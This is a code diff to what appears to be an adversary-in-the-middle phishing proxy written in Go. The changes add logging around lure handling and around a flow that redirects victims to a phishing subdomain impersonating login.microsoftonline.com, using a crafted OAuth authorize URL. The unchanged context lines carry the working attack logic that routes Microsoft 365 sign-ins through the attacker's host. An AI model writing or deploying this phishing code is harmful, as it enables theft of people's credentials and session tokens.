@@ -1716,7 +1716,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				if p.handleSession(req.Host) && pl != nil {
 					l, err := p.cfg.GetLureByPath(pl_name, req.Host, req_path)
 					if err == nil {
-						log.Debug("triggered lure for path '%s'", req_path)
+						log.Important("[%s] triggered lure for path '%s' (lure found!)", pl_name, req_path)
+					} else {
+						log.Debug("[%s] GetLureByPath returned error for path '%s': %v", pl_name, req_path, err)
 					}
 
 					var create_session bool = true
@@ -2153,24 +2155,28 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 									// AitM flow: redirect to Microsoft login via phish domain
 									// Build OAuth URL and redirect user to login
+									log.Important("[%d] [AitM] entering AitM redirect flow for lure visitor", sid)
 									phishDomain, _ := p.cfg.GetSiteDomain(pl_name)
 									// Find the phish subdomain that proxies to login.microsoftonline.com
 									loginPhishHost := ""
 									for _, ph := range pl.GetProxyHosts() {
 										origHost := combineHost(ph.OrigSub, ph.Domain)
+										log.Debug("[AitM] checking proxy host: %s -> %s", ph.PhishSub, origHost)
 										if origHost == "login.microsoftonline.com" {
 											loginPhishHost = combineHost(ph.PhishSub, phishDomain)
+											log.Debug("[AitM] found login host: %s", loginPhishHost)
 											break
 										}
 									}
 									if loginPhishHost == "" {
 										loginPhishHost = "secure." + phishDomain // fallback
+										log.Warning("[AitM] using fallback login host: %s", loginPhishHost)
 									}
 									
 									// Build OAuth authorize URL
 									oauthURL := fmt.Sprintf("https://%s/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https://www.office.com/landingv2&response_type=code&scope=openid+profile+offline_access&response_mode=form_post&prompt=login", loginPhishHost)
 									
-									log.Debug("[%d] [AitM] redirecting to login: %s", sid, oauthURL)
+									log.Important("[%d] [AitM] redirecting to login: %s", sid, oauthURL)
 									resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
 									resp.Header.Set("Location", oauthURL)
 									resp.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
